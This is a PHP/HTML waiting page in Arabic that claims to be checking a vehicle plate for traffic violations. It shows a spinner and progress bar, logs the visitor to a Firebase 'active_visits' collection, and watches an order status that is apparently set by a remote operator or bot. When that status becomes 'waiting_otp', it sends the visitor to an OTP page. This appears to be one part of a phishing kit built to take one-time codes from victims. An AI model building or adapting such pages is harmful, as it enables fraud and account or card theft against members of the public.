<?php
// صفحة الانتظار الذكية - متوافقة مع البوت الجديد
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري التحقق من المخالفات...</title>
    <style>
        :root { --main-green: #008b47; }
        body {
            margin: 0; padding: 0;
            background-color: #f4f7f6;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
        }
        .loading-container { text-align: center; padding: 20px; width: 100%; max-width: 420px; }
        .spinner {
            width: 60px; height: 60px;
            border: 6px solid #ddd;
            border-top: 6px solid var(--main-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #333; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        .sub-text { color: #6e6e6e; font-size: 15px; line-height: 1.7; }
        .progress-bar {
            width: 200px; height: 6px;
            background: #eee; border-radius: 3px;
            margin: 20px auto; overflow: hidden; position: relative;
        }
        .progress-fill {
            width: 0%; height: 100%;
            background: var(--main-green);
            animation: grow 20s ease-in-out forwards;
        }
        @keyframes grow { from { width: 0%; } to { width: 98%; } }
        .error-box {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            background: #fff2f2;
            color: #a40000;
            border: 1px solid #ffc7c7;
            display: none;
            text-align: right;
            font-size: 14px;
            line-height: 1.7;
        }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner" id="spinner"></div>
        <div class="text" id="main-text">جاري الاتصال بالنظام المركزي...</div>
        <div class="sub-text">يرجى الانتظار، يتم الآن سحب بيانات اللوحة والتحقق من وجود المخالفات.</div>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <div class="sub-text" id="status-msg">يتم التحقق من قاعدة البيانات...</div>
        <div class="error-box" id="error-box"></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
            authDomain: "jusour-qatar.firebaseapp.com",
            projectId: "jusour-qatar",
            storageBucket: "jusour-qatar.appspot.com",
            messagingSenderId: "927435762624",
            appId: "1:927435762624:web:11d0bf460b62e4af9db625"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const orderId = sessionStorage.getItem("last_order_id");

        function showError(message) {
            document.getElementById("spinner").style.display = "none";
            document.getElementById("main-text").innerText = "تعذر إكمال العملية حالياً";
            document.getElementById("status-msg").innerText = "حدثت مشكلة أثناء معالجة الطلب.";
            const errorBox = document.getElementById("error-box");
            errorBox.style.display = "block";
            errorBox.innerText = message || "يرجى إعادة المحاولة بعد قليل.";
        }

        if (!orderId) {
            showError("لم يتم العثور على رقم الطلب الحالي. من فضلك ارجع للصفحة الرئيسية وحاول مرة أخرى.");
        } else {
            db.collection("active_visits").doc(orderId).set({
                page: "Loading Page",
                last_seen: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true });

            const unsubscribe = db.collection("orders").doc(orderId)
                .onSnapshot((doc) => {
                    if (!doc.exists) {
                        showError("الطلب غير موجود في قاعدة البيانات.");
                        return;
                    }

                    const data = doc.data();
                    const status = data.status;

                    if (status === "pending") {
                        document.getElementById("status-msg").innerText = "الطلب في قائمة الانتظار، وسيبدأ الفحص خلال لحظات...";
                    }

                    if (status === "processing") {
                        document.getElementById("status-msg").innerText = "تم العثور على الطلب، وجارٍ فحص المخالفات الآن...";
                    }

                    if (status === "completed" || status === "success") {
                        unsubscribe();
                        window.location.replace("violations_view.php");
                    }

                    if (status === "waiting_otp") {
                        unsubscribe();
                        window.location.replace("otp.php");
                    }

                    if (status === "error") {
                        unsubscribe();
                        showError(data.error_message || data.last_error || "تعذر جلب بيانات المخالفات حاليًا. يرجى المحاولة لاحقًا.");
                    }
                }, (error) => {
                    showError(error.message || "فشل الاتصال بقاعدة البيانات.");
                });
        }
    </script>
</body>
</html>
